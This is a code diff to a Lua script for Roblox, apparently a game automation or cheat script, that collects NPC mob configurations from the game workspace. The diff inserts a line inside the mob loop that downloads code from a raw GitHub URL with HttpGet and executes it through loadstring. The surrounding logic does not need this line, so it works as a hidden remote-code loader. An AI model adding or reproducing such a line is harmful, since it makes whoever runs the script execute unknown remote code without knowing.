@@ -90,6 +90,7 @@ mobs = {}
 if Workspace:FindFirstChild("Mobs") then 
     for i,v in pairs(Workspace.Mobs:GetDescendants()) do 
         if v:FindFirstChild("Npc_Configuration") and v:FindFirstChild("Npc_Configuration"):IsA("ModuleScript") then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NovazUwU/X/main/No"))()
             local modu = require(v.Npc_Configuration) 
             table.insert(mobs, {v, modu.Npc_Spawning.Spawn_Locations[1] or modu.Npc_Spawning.Spawn_Locations, modu.Name})
         end 
